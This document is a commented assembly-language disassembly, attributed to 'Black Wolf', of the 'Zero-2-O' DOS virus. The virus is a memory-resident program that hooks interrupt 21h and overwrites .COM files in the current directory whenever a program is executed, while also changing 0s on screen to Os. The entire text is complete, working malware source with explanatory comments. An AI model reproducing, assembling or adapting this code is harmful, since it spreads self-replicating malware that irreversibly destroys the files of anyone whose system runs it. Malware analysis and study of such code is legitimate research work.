   ;Zero-2-O virus - memory resident overwriting virus.
   ;EXTREMELY simple, but it will destroy any file it infects.
   ;Infects .COM files (by searching the directory as a direct action would)
   ;whenever Int 21h, function 4bh (execute) is called.  At this point, it will
   ;also change any 0's on the screen (in normal text mode) to O's.

   ;NOTE: The name 'FORMAT.COM' appears in this file only because it was the
   ;last file infected by the virus.

   ;Disassembly by Black Wolf

   .model tiny
   .code

              org     100h
   start:
           jmp     Entry_Point                   ; (026D)

   Data_Area:      ;This is the data area of the file I received. Of course,
           ;since this is mainly dynamic such as the DTA, much of
           ;the data in this area will change with each infection.

   Store_SP          dw      837h
   Store_SS          dw      0B6Fh
   Store_AX          dw      4B00h

   Virus_Stack:

      Virus_Label  db      0,0dh,0ah
           db      'ScUD 1991!'
           db      0dh, 0ah

      Random_Stack_Data:
           db       0,0,0,0,0f0h,03,0bh,9bh,2ch,0,1,0
           db       1,65h,1,6ch,15h,9bh,40h,5,0,6ch,15h,0dfh
           db       40h,5,0,93h,1,0,1,0,1,0,1,81h
           db       0,0dfh,0ch,6fh,0bh,45h,2,0dfh,0ch,6,0f0h,0
           db       1,0,1,6fh,0bh,2ah,9bh,0b9h,41h,6fh,0bh,3
           db       0dh,0,4bh
   Top_Of_Stack:

           db      00h, 00h
   OldInt21Add     dd      0CB00194h
   FileMask        db      '*.COM',0
   Victims_Handle  dw      5
   VirusDTA        db      1,'????????COM',0
           db      3,0,0,0,2eh,8bh,26h,68h,20h,0,60h,72h,0eh
   NextFiles_Size  dw      2D65h
           db      0, 0
   NextFiles_Name  db      'FORMAT.COM',0
           db       0,0,0,4ah,52h,34h
   Int21_Handler:
           mov     cs:[Store_SP],sp
           mov     cs:[Store_SS],ss
           mov     cs:[Store_AX],ax


   ;This is changed because TASM automatically converts it to a mov sp,109.
           db 8dh,26h,09h,01h              ;lea     sp,cs:[109h]
                           ;109h = Virus Stack

           add     sp,Top_Of_Stack-Virus_Stack  ;Create Stack Frame
           mov     ax,cs
           mov     ss,ax                   ;Set SS:SP = CS:(109h+4Eh)

           mov     ax,cs:Store_AX          ;Restore AX to orig.

           cmp     ah,4Bh                  ;Load and Execute?
           je      Activate_And_Infect
           jmp     Leave_Int21


   Activate_And_Infect:
           push    ax bx cx dx ds es si di
           mov     ax,0B800h
           mov     ds,ax                  ;DS:BX = Video memory for
           mov     bx,0                   ;        normal text mode.
   Change_0_to_O:
           mov     al,[bx]                ;Get character on screen
           cmp     al,'0'                 ;Is it a '0'?
           jne     Goto_Next_Char         ;No, put it back and go on...
           mov     al,'O'                 ;Yes, change it to 'O'

   Goto_Next_Char:
           mov     [bx],al                 ;Place character back onto
           inc     bx                      ;screen.
           inc     bx                      ;Go to next character...
           cmp     bx,1000h                ;Check if we are a little
           jne     Change_0_to_O           ;past the end of screen.


           mov     ax,cs
           mov     ds,ax
           mov     dx,offset VirusDTA
           mov     ah,1Ah

           pushf
           call    cs:OldInt21Add               ;Set DTA....

           mov     ax,cs
           mov     ds,ax
           mov     dx,offset FileMask
           mov     cx,0
           mov     ah,4Eh

           pushf
           call    cs:OldInt21Add               ;Find first match...

           jc      Done_Infections
           cmp     NextFiles_Size,end_virus-start
           jne     Overwrite_File

   FindNextFile:
           mov     ah,4Fh

           pushf
           call    cs:OldInt21Add

           jc      Done_Infections
           cmp     NextFiles_Size,end_virus-start
           jne     Overwrite_File
           jmp     short FindNextFile

   Overwrite_File:
           mov     ax,cs
           mov     ds,ax
           mov     dx,offset NextFiles_NAme
           mov     ah,3Ch
           mov     cx,0
           pushf
           call    cs:OldInt21Add               ;Truncate/Create file...

           mov     Victims_Handle,ax            ;Save Victim's file hand.
           mov     ax,cs
           mov     ds,ax
           mov     bx,Victims_Handle
           mov     cx,end_virus-start
           mov     dx,100h
           mov     ah,40h
           pushf
           call    cs:OldInt21Add               ;Write virus to file..

           mov     bx,Victims_Handle
           mov     ah,3Eh                  ;And close it...
           pushf

           call    cs:OldInt21Add

   Done_Infections:
           pop     di si es ds dx cx bx ax

   Leave_Int21:
           mov     sp,cs:Store_SP
           mov     ax,cs:Store_SS
           mov     ss,ax
           mov     ax,cs:Store_AX
           jmp     cs:OldInt21Add

   Entry_Point:
           mov     ax,cs
           mov     ds,ax
           mov     es,ax
           mov     ss,ax
           mov     ax,3521h
           int     21h                     ;Get Int 21 Address...

           mov     word ptr OldInt21Add,bx
           mov     word ptr OldInt21Add+2,es
           mov     ax,cs
           mov     ds,ax
           mov     ax,2521h
           mov     dx,offset Int21_Handler
           int     21h                     ;Set it to viral handler

           mov     dx,offset end_virus
           int     27h                     ;Go TSR

   end_virus:
   end     start
